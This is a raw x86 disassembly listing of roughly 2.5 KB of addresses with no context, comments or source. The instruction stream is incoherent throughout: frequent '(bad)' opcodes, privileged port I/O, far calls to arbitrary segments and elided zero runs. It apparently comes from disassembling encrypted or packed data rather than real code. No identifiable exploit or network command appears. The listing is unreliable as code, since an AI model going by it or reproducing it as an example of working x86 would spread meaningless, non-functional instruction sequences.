  41d2c1:	mov    si,0x660d
  41d2c5:	dec    eax
  41d2c6:	es xchg esp,eax
  41d2c8:	mov    cl,0x56
  41d2ca:	jmp    0x41d2fa
  41d2cc:	(bad)  
  41d2cd:	adc    edi,eax
  41d2cf:	and    dh,dh
  41d2d1:	pop    ebx
  41d2d2:	inc    ebx
  41d2d3:	das    
  41d2d4:	addr16 iret 
  41d2d6:	or     eax,0xdb6850ec
  41d2db:	xchg   ebp,eax
  41d2dc:	mov    ecx,0x7466ac9
  41d2e1:	out    0xda,eax
  41d2e3:	hlt    
  41d2e4:	add    eax,0x792e4e05
  41d2e9:	pop    ds
  41d2ea:	push   0xfffffff8
  41d2ec:	out    0x80,eax
  41d2ee:	sbb    al,0xf0
  41d2f0:	xchg   edx,eax
  41d2f1:	xchg   ebx,eax
  41d2f2:	bound  esi,QWORD PTR [edi+esi*2]
  41d2f5:	idiv   DWORD PTR [ebp+0x416a5998]
  41d2fb:	sahf   
  41d2fc:	rcr    esp,0xc3
  41d2ff:	mov    cl,0xa5
  41d301:	(bad)  
  41d302:	in     al,dx
  41d303:	retf   0x3324
  41d306:	or     al,0x51
  41d308:	xor    bl,ah
  41d30a:	enter  0x4b98,0x1b
  41d30e:	out    dx,al
  41d30f:	test   BYTE PTR [eax],0x0
	...
  41d372:	add    BYTE PTR [eax],al
  41d374:	inc    BYTE PTR [eax+0x7dff54f9]
  41d37a:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d380:	mov    edi,DWORD PTR [esi]
  41d382:	jmp    0x1783c00
  41d387:	add    BYTE PTR [ecx+eax*1],al
  41d38a:	add    BYTE PTR [eax],al
  41d38c:	and    ch,BYTE PTR [ebp+0xe0ce302]
  41d392:	cmc    
  41d393:	sub    DWORD PTR [ebp-0x39a61462],ebx
  41d399:	mov    eax,ds:0x426b84d6
  41d39e:	je     0x41d401
  41d3a0:	repz mov cl,0x9d
  41d3a3:	mov    eax,0x244b8a22
  41d3a8:	stc    
  41d3a9:	add    eax,0xdb193111
  41d3ae:	ficom  WORD PTR [ecx-0x50]
  41d3b1:	xchg   ecx,eax
  41d3b2:	test   BYTE PTR [esi+0x1d],dl
  41d3b5:	popf   
  41d3b6:	test   BYTE PTR [esi],bh
  41d3b8:	inc    ebx
  41d3b9:	aam    0x31
  41d3bb:	fdivr  DWORD PTR ds:0x3fd47ead
  41d3c1:	dec    ecx
  41d3c2:	push   ss
  41d3c3:	das    
  41d3c4:	cmp    BYTE PTR [edx+0x5feafc8d],bh
  41d3ca:	out    0x47,eax
  41d3cc:	mov    ds:0xd061bae2,eax
  41d3d1:	loop   0x41d3c9
  41d3d3:	inc    eax
  41d3d4:	sbb    DWORD PTR [esi+0x1445a995],edx
  41d3da:	inc    edx
  41d3db:	(bad)  
  41d3dc:	pop    ds
  41d3dd:	push   ebp
  41d3de:	pop    esi
  41d3df:	mov    al,ds:0xaf330872
  41d3e4:	and    DWORD PTR [ebp+0x3915151f],edx
  41d3ea:	xchg   BYTE PTR [ecx+0x4369d607],cl
  41d3f0:	test   al,0xfc
  41d3f2:	shr    BYTE PTR [ecx+0x507053bb],0x2c
  41d3f9:	push   edi
  41d3fa:	add    dh,dl
  41d3fc:	in     eax,dx
  41d3fd:	push   cs
  41d3fe:	leave  
  41d3ff:	shl    BYTE PTR [esi-0x75],cl
  41d402:	daa    
  41d403:	inc    esi
  41d404:	stos   DWORD PTR es:[edi],eax
  41d405:	idiv   DWORD PTR [ebx+ecx*8+0x3f]
  41d409:	jb     0x41d404
  41d40b:	shl    bl,1
  41d40d:	cdq    
  41d40e:	xor    al,0x9e
  41d410:	inc    edi
  41d411:	je     0x41d422
  41d413:	xchg   esi,eax
  41d414:	daa    
  41d415:	push   ds
  41d416:	js     0x41d3df
  41d418:	jne    0x41d451
  41d41a:	xor    edi,0xffffffaf
  41d41d:	out    dx,eax
  41d41e:	lods   eax,DWORD PTR ds:[esi]
  41d41f:	repnz sub ebx,0x3e
  41d423:	gs jecxz 0x41d3eb
  41d426:	stos   BYTE PTR es:[edi],al
  41d427:	xchg   ecx,eax
  41d428:	cwde   
  41d429:	xlat   BYTE PTR ds:[ebx]
  41d42a:	and    al,0x29
  41d42c:	mov    ds:0x46af1fd7,eax
  41d431:	ja     0x41d4af
  41d433:	rcr    esp,0xaa
  41d436:	jns    0x41d4ac
  41d438:	out    0xc,eax
  41d43a:	push   ds
  41d43b:	sub    DWORD PTR [ebx+0x1c6db955],esp
  41d441:	ins    BYTE PTR es:[edi],dx
  41d442:	int    0xca
  41d444:	mov    bl,0xa5
  41d446:	jecxz  0x41d40c
  41d448:	pusha  
  41d449:	dec    ebp
  41d44a:	icebp  
  41d44b:	mov    al,ds:0x26fe07e2
  41d450:	xchg   edx,ebp
  41d452:	arpl   WORD PTR [ebx],bp
  41d454:	cmp    BYTE PTR [eax+0x19ce719e],0x72
  41d45b:	xchg   ecx,eax
  41d45c:	fimul  WORD PTR [eax-0x5c]
  41d45f:	sub    esp,DWORD PTR [edi+0xa]
  41d462:	sub    bl,bh
  41d464:	add    esi,edx
  41d466:	push   ecx
  41d467:	dec    esp
  41d468:	inc    esi
  41d469:	sbb    al,0x53
  41d46b:	xor    al,0x13
  41d46d:	or     DWORD PTR [ecx],ecx
  41d46f:	lds    edx,FWORD PTR [eax-0x27a41f64]
  41d475:	and    bh,bl
  41d477:	je     0x41d477
  41d479:	dec    esp
  41d47a:	and    eax,0x631967e
  41d47f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d481:	cld    
  41d482:	pop    esp
  41d483:	jge    0x41d4d6
  41d485:	jmp    0x41d41f
  41d487:	loop   0x41d432
  41d489:	sub    esi,DWORD PTR [edx+0x57]
  41d48c:	jbe    0x41d40f
  41d48e:	fistp  WORD PTR [edx+0x0]
	...
  41d4f4:	div    BYTE PTR [esi]
  41d4f6:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0x6cf1:0xb1098e89
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    al,0x1
  41d50a:	add    BYTE PTR [eax],al
  41d50c:	rep ins BYTE PTR es:[edi],dx
  41d50e:	fiadd  WORD PTR [esi]
  41d510:	sbb    BYTE PTR [edx+esi*2+0x74],cl
  41d514:	dec    edi
  41d515:	mov    al,ds:0xb928ea35
  41d51a:	jle    0x41d52e
  41d51c:	cwde   
  41d51d:	retf   0xbb98
  41d520:	inc    ebx
  41d521:	int    0xce
  41d523:	aaa    
  41d524:	xor    ebp,DWORD PTR [ecx+0x33]
  41d527:	sahf   
  41d528:	addr16 sahf 
  41d52a:	inc    ebp
  41d52b:	cmp    BYTE PTR [ebp-0x4727c141],dl
  41d531:	cs mov ds,esp
  41d534:	inc    ebp
  41d535:	jne    0x41d521
  41d537:	lods   eax,DWORD PTR ds:[esi]
  41d538:	ins    BYTE PTR es:[edi],dx
  41d539:	iret   
  41d53a:	in     eax,0x49
  41d53c:	mov    eax,DWORD PTR [ecx]
  41d53e:	or     BYTE PTR [ebx-0x27],ch
  41d541:	xchg   ecx,eax
  41d542:	xchg   DWORD PTR [ecx+0x6c6fcf6b],ebp
  41d548:	xor    esi,ebx
  41d54a:	dec    ebx
  41d54b:	mov    es,WORD PTR [ebp-0x2d]
  41d54e:	data16 xlat BYTE PTR ds:[ebx]
  41d550:	inc    eax
  41d551:	inc    eax
  41d552:	mov    edi,0x912d61f6
  41d557:	sbb    eax,0x3192673e
  41d55c:	sub    al,0x81
  41d55e:	cmp    BYTE PTR [ebp-0x3eb94c3f],0xf5
  41d565:	into   
  41d566:	cdq    
  41d567:	sub    BYTE PTR [ebx-0x6e],bh
  41d56a:	cmp    al,BYTE PTR [edx]
  41d56c:	mov    eax,ds:0x73385467
  41d571:	fwait
  41d572:	(bad)  
  41d573:	jg     0x41d5c0
  41d575:	adc    DWORD PTR [edx-0x58bf744a],esi
  41d57b:	cmp    edi,0xa455b6a2
  41d581:	ss dec edx
  41d583:	pusha  
  41d584:	rol    BYTE PTR [edi-0x74],0x76
  41d588:	xchg   ebx,eax
  41d589:	sbb    ah,al
  41d58b:	adc    esi,DWORD PTR [ecx]
  41d58d:	(bad)  
  41d58e:	push   ebx
  41d58f:	ret    0x9bd3
  41d592:	or     al,0x9c
  41d594:	push   ss
  41d595:	sub    edi,DWORD PTR [edx-0x4d92cf05]
  41d59b:	push   cs
  41d59c:	xchg   ebx,esi
  41d59e:	aad    0x43
  41d5a0:	mov    cl,0xc2
  41d5a2:	mov    dl,0x44
  41d5a4:	mov    esi,0x852ebf25
  41d5a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5aa:	hlt    
  41d5ab:	clc    
  41d5ac:	call   0x8801:0x9d3e654
  41d5b3:	jo     0x41d58a
  41d5b5:	test   eax,0x2e863904
  41d5ba:	dec    esp
  41d5bb:	mov    bh,0xb
  41d5bd:	outs   dx,BYTE PTR ds:[esi]
  41d5be:	ror    BYTE PTR [ebp+ebp*4+0x52],0x4c
  41d5c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5c4:	dec    ecx
  41d5c5:	adc    esi,DWORD PTR [edx-0x68]
  41d5c8:	jne    0x41d62d
  41d5ca:	and    eax,0xdcd1ec6d
  41d5cf:	lahf   
  41d5d0:	ret    0x7825
  41d5d3:	push   esi
  41d5d4:	mov    cl,0x3f
  41d5d7:	fistp  QWORD PTR [edi]
  41d5d9:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41d5db:	adc    eax,0xdbc04921
  41d5e0:	int    0x56
  41d5e2:	unpcklps xmm4,xmm1
  41d5e5:	sbb    edx,DWORD PTR [edx+0x1e]
  41d5e8:	push   esi
  41d5e9:	mov    BYTE PTR [ecx-0x4087d001],cl
  41d5ef:	enter  0x6c9b,0x5
  41d5f3:	int    0x6c
  41d5f5:	stc    
  41d5f6:	int3   
  41d5f7:	lods   al,BYTE PTR ds:[esi]
  41d5f8:	enter  0xb211,0xfe
  41d5fc:	repnz and esi,DWORD PTR [edx+ebp*1+0x60]
  41d601:	(bad)  
  41d602:	imul   esi,DWORD PTR [ecx-0x4b337176],0x27
  41d609:	call   0x78cdf657
  41d60e:	(bad)  
  41d60f:	leave  
	...
  41d674:	jl     0x41d60f
  41d676:	dec    esp
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0x1c66e435
  41d681:	inc    esp
  41d682:	lahf   
  41d683:	mov    al,ds:0x13870
  41d688:	add    al,0x1
  41d68a:	add    BYTE PTR [eax],al
  41d68c:	fcom   QWORD PTR [ebp+0x5aab8275]
  41d692:	adc    DWORD PTR [ecx+0x1d6763bd],eax
  41d698:	mov    esi,0xe721142d
  41d69d:	adc    edx,DWORD PTR ds:[esi+0x3c7d043e]
  41d6a4:	adc    DWORD PTR [ecx+edx*2],esp
  41d6a7:	dec    edi
  41d6a8:	adc    al,0x94
  41d6aa:	and    DWORD PTR [edi+0x3c7cf86a],edi
  41d6b0:	mov    gs,WORD PTR [ecx+0x30]
  41d6b3:	adc    al,0xf8
  41d6b5:	sub    ebp,DWORD PTR [ebx]
  41d6b7:	sti    
  41d6b8:	stos   BYTE PTR es:[edi],al
  41d6b9:	mov    edi,0xd584b7c4
  41d6be:	sbb    eax,0x1d206578
  41d6c3:	and    bh,BYTE PTR ds:0xd150d0e0
  41d6c9:	xchg   ecx,eax
  41d6ca:	xchg   ebx,eax
  41d6cb:	sub    al,0xea
  41d6cd:	sub    eax,0xc1e039c5
  41d6d2:	jp     0x41d65b
  41d6d4:	nop
  41d6d5:	push   ds
  41d6d6:	jecxz  0x41d6c5
  41d6d8:	cmc    
  41d6d9:	jg     0x41d6f2
  41d6db:	push   ecx
  41d6dc:	ds call 0xc0e648ec
  41d6e2:	data16 mov WORD PTR [edx],ss
  41d6e5:	popf   
  41d6e6:	shl    BYTE PTR [eax-0x41c2846a],0x5a
  41d6ed:	or     eax,0x792418aa
  41d6f2:	jmp    0xd6dbbcdf
  41d6f7:	js     0x41d6c2
  41d6f9:	call   0xbc5d:0x71d75f16
  41d700:	in     al,0x49
  41d702:	outs   dx,DWORD PTR ds:[esi]
  41d703:	sbb    BYTE PTR [ebx-0x7d],ah
  41d706:	mov    eax,0x964069e3
  41d70b:	add    al,0xab
  41d70d:	inc    ecx
  41d70e:	pop    es
  41d70f:	push   ecx
  41d710:	push   cs
  41d711:	push   0xffffff81
  41d713:	mov    ebp,0x282f7553
  41d718:	mov    ds,eax
  41d71a:	mov    esp,0x3a97e566
  41d71f:	fstp   QWORD PTR [ecx-0x5ede6812]
  41d725:	pop    eax
  41d726:	dec    ecx
  41d727:	ror    DWORD PTR ds:0x336f1c63,1
  41d72d:	jmp    0xcd4ede80
  41d732:	iret   
  41d733:	pop    eax
  41d734:	inc    esp
  41d735:	es lahf 
  41d737:	or     dl,dl
  41d739:	call   0xc156:0x647bd4d2
  41d740:	push   cs
  41d741:	push   edi
  41d742:	int3   
  41d743:	imul   eax,DWORD PTR [edi],0x1759e9a1
  41d749:	push   esp
  41d74a:	aam    0x2e
  41d74c:	scas   eax,DWORD PTR es:[edi]
  41d74d:	(bad)  [eax]
  41d74f:	leave  
  41d750:	adc    al,0x48
  41d752:	addr16 push 0x54
  41d755:	or     ecx,ebp
  41d757:	inc    ebp
  41d758:	lods   eax,DWORD PTR ds:[esi]
  41d759:	adc    BYTE PTR [edi],ah
  41d75b:	shl    BYTE PTR [edi],1
  41d75d:	in     eax,0xc3
  41d75f:	push   ecx
  41d760:	or     bl,BYTE PTR [ebx+edx*4-0x66fae85e]
  41d767:	adc    eax,0xe2970fb2
  41d76c:	aas    
  41d76d:	lock shr DWORD PTR [ebp-0x5b],0xee
  41d772:	cld    
  41d773:	and    al,0x68
  41d775:	xor    BYTE PTR [edi+0x3d0c2eb],ah
  41d77b:	(bad)
  41d77e:	or     DWORD PTR [esi+0x3ce1e56c],ebp
  41d784:	inc    edx
  41d785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d786:	inc    ebx
  41d787:	cli    
  41d788:	add    DWORD PTR [esi],esp
  41d78a:	mov    ebp,0xd79ca5f3
  41d78f:	data16 add BYTE PTR [eax],al
	...
  41d7f2:	add    BYTE PTR [eax],al
  41d7f4:	and    al,0xce
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d801:	rcr    BYTE PTR [edi-0x80],0x74
  41d805:	cmp    DWORD PTR [ecx],eax
  41d807:	add    BYTE PTR [ecx+eax*1],al
  41d80a:	add    BYTE PTR [eax],al
  41d80c:	and    al,0x97
  41d80e:	fwait
  41d80f:	inc    eax
  41d810:	imul   ebx,DWORD PTR [esi],0x4f
  41d813:	jns    0x41d86f
  41d815:	fprem1 
  41d817:	pop    eax
  41d818:	or     ch,BYTE PTR [ebx-0x4d843d8a]
  41d81e:	jo     0x41d7b1
  41d820:	and    eax,0x3d3272c9
  41d825:	jecxz  0x41d892
  41d827:	nop
  41d828:	ror    DWORD PTR [esi],0x8d
  41d82b:	call   0x43860d47
  41d830:	or     eax,0x4a8ae6e0
  41d835:	add    DWORD PTR [edx+0x3bfee488],edx
  41d83b:	std    
  41d83c:	idiv   BYTE PTR [ebp+0x144615ef]
  41d842:	outs   dx,DWORD PTR ds:[esi]
  41d843:	adc    al,0xff
  41d845:	mov    edi,0xc3d29340
  41d84a:	out    0xfe,al
  41d84c:	les    ecx,FWORD PTR [edi-0xc9e2748]
  41d852:	dec    eax
  41d853:	pop    ebp
  41d854:	clc    
  41d855:	add    edx,edx
  41d857:	loope  0x41d7e4
  41d859:	fwait
  41d85a:	jb     0x41d804
  41d85c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d85d:	imul   BYTE PTR [ebx+esi*2-0x2ddf4849]
  41d864:	sub    BYTE PTR [ebx+0x7b],dl
  41d867:	into   
  41d868:	or     eax,0x8644aaaa
  41d86d:	mov    WORD PTR [edi],fs
  41d86f:	mov    ch,0xd9
  41d871:	adc    DWORD PTR [esi],ecx
  41d873:	test   DWORD PTR [ecx],ecx
  41d875:	jo     0x41d813
  41d877:	sti    
  41d878:	adc    ah,BYTE PTR [ebp+ebx*8-0x7d945cdb]
  41d87f:	in     eax,dx
  41d880:	popf   
  41d881:	jmp    0x7f75da6a
  41d886:	push   ecx
  41d887:	test   eax,0x16b385b4
  41d88c:	inc    ecx
  41d88d:	inc    ebp
  41d88e:	push   eax
  41d88f:	jle    0x41d8c9
  41d891:	mov    esp,0x5f97781e
  41d896:	inc    eax
  41d897:	xlat   BYTE PTR ds:[ebx]
  41d898:	iret   
  41d899:	jecxz  0x41d820
  41d89b:	ins    BYTE PTR es:[edi],dx
  41d89c:	fsubr  QWORD PTR [edi]
  41d89e:	mov    eax,ds:0xe292c37c
  41d8a3:	jl     0x41d857
  41d8a5:	xchg   BYTE PTR [ecx+eiz*1+0x64],cl
  41d8a9:	sbb    al,0xf9
  41d8ab:	and    DWORD PTR [edx+0x45],ebp
  41d8ae:	push   edx
  41d8af:	gs mov al,0xdc
  41d8b2:	dec    esp
  41d8b3:	nop
  41d8b4:	push   ss
  41d8b5:	mov    bl,0x3a
  41d8b7:	add    BYTE PTR [edx-0x5e],ch
  41d8ba:	jns    0x41d847
  41d8bc:	stc    
  41d8bd:	and    eax,0x14d5bccd
  41d8c2:	or     cl,BYTE PTR [edx-0x432b5785]
  41d8c8:	add    ch,cl
  41d8ca:	das    
  41d8cb:	sti    
  41d8cc:	aad    0x2
  41d8ce:	ins    BYTE PTR es:[edi],dx
  41d8cf:	je     0x41d940
  41d8d1:	mov    ds:0x2fd7132b,eax
  41d8d6:	push   ds
  41d8d7:	mov    esp,0x14fb0b07
  41d8dc:	pop    ds
  41d8dd:	push   edx
  41d8de:	add    DWORD PTR [edi],ecx
  41d8e0:	stos   BYTE PTR es:[edi],al
  41d8e1:	loope  0x41d8c4
  41d8e3:	mov    eax,0xa3d10295
  41d8e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8e9:	sbb    edx,DWORD PTR [esi+0x41]
  41d8ec:	jae    0x41d907
  41d8ee:	call   DWORD PTR [edx-0x36660367]
  41d8f4:	fsubrp st(3),st
  41d8f6:	add    bh,bl
  41d8f8:	into   
  41d8f9:	into   
  41d8fa:	out    0x8d,al
  41d8fc:	jge    0x41d889
  41d8fe:	icebp  
  41d8ff:	push   esp
  41d900:	call   0x13e3:0x833319e8
  41d907:	jne    0x41d92d
  41d909:	rol    BYTE PTR ds:0x1662b5cd,0x5d
	...
  41d974:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	fimul  DWORD PTR gs:[ebp-0x67]
  41d983:	jns    0x41d9fd
  41d985:	cmp    al,BYTE PTR [ecx]
  41d987:	add    BYTE PTR [ecx+eax*1],al
  41d98a:	add    BYTE PTR [eax],al
  41d98c:	dec    edx
  41d98d:	inc    ebp
  41d98e:	dec    ecx
  41d98f:	mov    ah,0xad
  41d991:	or     eax,0x2a1650ab
  41d996:	mov    ebp,0x4333c2b5
  41d99b:	jecxz  0x41d9eb
  41d99d:	cmp    ch,ch
  41d99f:	or     bh,al
  41d9a1:	pushf  
  41d9a2:	das    
  41d9a3:	or     eax,0xde46c381
  41d9a8:	inc    DWORD PTR [ebp+0x46]
  41d9ab:	jp     0x41d956
  41d9ad:	fild   DWORD PTR [edx-0x43]
  41d9b0:	stos   BYTE PTR es:[edi],al
  41d9b1:	xchg   esi,eax
  41d9b2:	mov    DWORD PTR [ebp+0x4e],esi
  41d9b5:	mov    ebx,0xbb9c5fb6
  41d9ba:	in     eax,dx
  41d9bb:	lea    esp,[edx]
  41d9bd:	xchg   ebx,eax
  41d9be:	(bad)  
  41d9c0:	test   BYTE PTR [ebx+0x112ce5b6],cl
  41d9c6:	and    BYTE PTR [ebx],ah
  41d9c8:	add    bl,BYTE PTR [ebx-0x20]
  41d9cb:	dec    ecx
  41d9cc:	jp     0x41d964
  41d9ce:	dec    edx
  41d9cf:	sub    DWORD PTR [ebx-0xecc2ba],edi
  41d9d5:	clc    
  41d9d6:	stc    
  41d9d7:	xchg   edx,eax
  41d9d8:	(bad)  
  41d9da:	repnz adc dl,ah
  41d9dd:	frstor es:[eax]
  41d9e0:	test   al,0x76
  41d9e2:	xchg   esp,eax
  41d9e3:	push   edi
  41d9e4:	and    esi,DWORD PTR [ebp+ebp*4-0x5f]
  41d9e8:	mov    edi,0xa4ae5b88
  41d9ed:	bound  edx,QWORD PTR [edx+esi*4-0x60]
  41d9f1:	xlat   BYTE PTR ds:[ebx]
  41d9f2:	dec    esp
  41d9f3:	sahf   
  41d9f4:	adc    BYTE PTR [ecx+0x33],dl
  41d9f7:	(bad)
  41d9fb:	jmp    0x84ed:0x5e30b5d3
  41da02:	pop    ecx
  41da03:	fcomp  QWORD PTR [edi]
  41da05:	xor    BYTE PTR [eax],dl
  41da07:	(bad)  
  41da09:	inc    esp
  41da0a:	fdiv   DWORD PTR [ebp-0x7a]
  41da0d:	addr16 or al,0x84
  41da10:	pop    esp
  41da11:	xchg   esi,eax
  41da12:	scas   al,BYTE PTR es:[edi]
  41da13:	mov    eax,ds:0x5d87af5c
  41da18:	in     eax,0xc5
  41da1a:	inc    esi
  41da1b:	and    DWORD PTR [edx],ebx
  41da1d:	adc    ecx,esi
  41da1f:	sub    BYTE PTR [ebp+0x60],bh
  41da22:	imul   esp,DWORD PTR [eax+0x79],0xffffff9d
  41da26:	mov    esi,0x5533cb63
  41da2b:	ss pop ebp
  41da2d:	pusha  
  41da2e:	test   al,ah
  41da30:	mov    ebx,0x57be091
  41da35:	inc    ecx
  41da36:	and    ecx,0xa969e816
  41da3c:	pushf  
  41da3d:	sahf   
  41da3e:	inc    esi
  41da3f:	js     0x41da13
  41da41:	sbb    al,0x7a
  41da43:	lods   eax,DWORD PTR ds:[esi]
  41da44:	fmul   QWORD PTR [edx+0x690c232a]
  41da4b:	inc    ebx
  41da4c:	test   BYTE PTR [ebx+0x5915e065],0x29
  41da53:	loope  0x41dabc
  41da55:	cli    
  41da56:	sbb    eax,0x66c41b38
  41da5b:	lahf   
  41da5c:	add    BYTE PTR [esi+ecx*8-0x36a4cb64],dh
  41da63:	dec    ecx
  41da64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da65:	imul   edx,DWORD PTR [ecx],0xfffffffb
  41da68:	rcl    BYTE PTR [ebx],1
  41da6a:	dec    edi
  41da6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da6c:	ins    DWORD PTR es:[edi],dx
  41da6d:	stos   BYTE PTR es:[edi],al
  41da6e:	in     al,dx
  41da6f:	mov    ch,0x10
  41da71:	aam    0x4a
  41da73:	sub    DWORD PTR [ebp+ebp*8+0x235e45a],ebp
  41da7a:	or     edx,DWORD PTR [ecx-0x16d1482]
  41da80:	push   es
  41da81:	(bad)  
  41da82:	mov    ds:0x5916fa3b,al
  41da87:	or     al,0x71
  41da89:	mov    esp,0xc6f368f0
  41da8e:	cs sub al,0x0
	...
  41daf1:	add    BYTE PTR [eax],al
  41daf3:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0x15
  41db01:	fild   QWORD PTR [edx+ebp*4+0x13b7c]
  41db08:	add    al,0x1
  41db0a:	add    BYTE PTR [eax],al
  41db0c:	repz lahf 
  41db0e:	nop
  41db0f:	or     al,0xcc
  41db11:	out    0xfe,eax
  41db13:	retf   
  41db14:	in     eax,0xa9
  41db16:	adc    al,0xbd
  41db18:	xchg   edi,eax
  41db19:	sbb    DWORD PTR [edx-0x79],ebp
  41db1c:	outs   dx,DWORD PTR ds:[esi]
  41db1d:	pmuludq mm5,QWORD PTR [eax]
  41db20:	inc    eax
  41db21:	retf   0x516
  41db24:	lods   eax,DWORD PTR ds:[esi]
  41db25:	leave  
  41db26:	ja     0x41daef
  41db28:	or     eax,0xed261f12
  41db2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db2e:	stos   BYTE PTR es:[edi],al
  41db2f:	stos   BYTE PTR es:[edi],al
  41db30:	mov    esi,esp
  41db32:	jno    0x41db74
  41db34:	add    bh,BYTE PTR [esi-0x20]
  41db37:	lock adc al,0x51
  41db3a:	call   0x8732:0x8dbdaea8
  41db41:	sub    BYTE PTR [edi+0x2c],al
  41db44:	cmp    BYTE PTR [edi],0x46
  41db47:	das    
  41db48:	in     al,0xe8
  41db4a:	push   es
  41db4b:	xor    al,0x93
  41db4d:	or     BYTE PTR [edx+0x55],al
  41db50:	cdq    
  41db51:	cmp    DWORD PTR [edi+0xee2d9c1],esi
  41db57:	scas   al,BYTE PTR es:[edi]
  41db58:	jae    0x41db66
  41db5a:	arpl   WORD PTR [bp+di],bp
  41db5d:	fcmovu st,st(1)
  41db5f:	stc    
  41db60:	pop    ds
  41db61:	nop
  41db62:	in     eax,0x65
  41db64:	push   ds
  41db65:	(bad)  
  41db66:	pusha  
  41db67:	lock sub ch,BYTE PTR fs:[ebp+0x45]
  41db6c:	sub    DWORD PTR [esi+ecx*4],esp
  41db6f:	add    esi,DWORD PTR [edx]
  41db71:	(bad)  
  41db72:	jg     0x41dbea
  41db74:	push   ecx
  41db75:	and    al,0x77
  41db77:	popf   
  41db78:	test   al,0x5e
  41db7a:	adc    eax,0x781d00d5
  41db7f:	cmp    ch,ah
  41db81:	icebp  
  41db82:	inc    ecx
  41db83:	mov    ebp,0xe4fabe87
  41db88:	add    ecx,DWORD PTR [eax+ebp*8]
  41db8b:	and    DWORD PTR [eax+0x51e0f3dc],edi
  41db91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db92:	sahf   
  41db93:	outs   dx,DWORD PTR ds:[esi]
  41db94:	mov    eax,0xdc8d708
  41db99:	in     al,0x5f
  41db9b:	(bad)  
  41db9d:	pushf  
  41db9e:	ja     0x41db38
  41dba0:	hlt    
  41dba1:	sbb    al,0x99
  41dba3:	data16 jb 0x41db84
  41dba6:	sub    eax,0x7b44c320
  41dbab:	xchg   BYTE PTR [edx+ebp*2+0x25],ch
  41dbaf:	pop    ss
  41dbb0:	mov    esi,0x8e8c03d
  41dbb5:	sub    BYTE PTR [eax+0x7e352c4c],bl
  41dbbb:	test   BYTE PTR [ecx+esi*4],ah
  41dbbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbbf:	xchg   esi,eax
  41dbc0:	fidiv  DWORD PTR [esi-0x15]
  41dbc3:	mov    cl,0x19
  41dbc5:	pop    ds
  41dbc6:	mov    WORD PTR [esi-0x3b55be71],ss
  41dbcc:	push   0x47
  41dbce:	aad    0xce
  41dbd0:	and    bl,BYTE PTR [eax+0x48f536dd]
  41dbd6:	xchg   edi,eax
  41dbd7:	repnz fwait
  41dbd9:	push   es
  41dbda:	jg     0x41dbcd
  41dbdc:	repz jns 0x41dc5b
  41dbdf:	xchg   ebx,edx
  41dbe1:	push   0xb581e944
  41dbe6:	jmp    0x558:0x73410585
  41dbed:	mov    ecx,edx
  41dbef:	in     eax,dx
  41dbf0:	push   0xdeae3804
  41dbf5:	lds    edi,FWORD PTR [ebp+0x48]
  41dbf8:	jg     0x41db82
  41dbfa:	push   es
  41dbfb:	sub    DWORD PTR [edi],edx
  41dbfd:	dec    edi
  41dbfe:	pop    eax
  41dbff:	or     DWORD PTR [ebp+0x67],0xc8134ec1
  41dc06:	fwait
  41dc07:	es mov ah,0xb4
  41dc0a:	fldenv [esi]
  41dc0c:	push   esp
  41dc0d:	sbb    edx,esi
  41dc0f:	dec    ebp
	...
  41dc74:	outs   dx,DWORD PTR ds:[esi]
  41dc75:	retf   0x9815
  41dc78:	mov    ch,0xdf
  41dc7a:	out    dx,eax
  41dc7b:	jmp    DWORD PTR [edi+0x38b0d050]
  41dc81:	adc    eax,0x3c80d57d
  41dc86:	add    DWORD PTR [eax],eax
  41dc88:	add    al,0x1
  41dc8a:	add    BYTE PTR [eax],al
  41dc8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc8d:	loop   0x41dc29
  41dc8f:	hlt    
  41dc90:	xchg   edi,eax
  41dc91:	adc    esp,ecx
  41dc93:	addr16 mov bl,0x12
  41dc96:	fcom   QWORD PTR [esi-0x11efebf0]
  41dc9c:	imul   eax,DWORD PTR [esi+0x63],0xeae3e010
  41dca3:	fnstsw ax
  41dca5:	shr    BYTE PTR [ecx-0x7195034e],cl
  41dcab:	repz or DWORD PTR [eax],esp
  41dcae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcaf:	(bad)  
  41dcb0:	mov    ebx,0x35009fa9
  41dcb5:	(bad)  
  41dcb6:	call   0x41de0e0c
  41dcbb:	push   0x6f
  41dcbd:	test   DWORD PTR [eax-0x23],ebx
  41dcc0:	(bad)  
  41dcc1:	lods   eax,DWORD PTR ds:[esi]
  41dcc2:	mov    ebx,0x94eacd49
  41dcc7:	test   al,0xbf
  41dcc9:	jg     0x41dcd2
  41dccb:	sub    eax,0x502c1f84
  41dcd0:	fisttp QWORD PTR [esi-0x79]
  41dcd3:	(bad)  
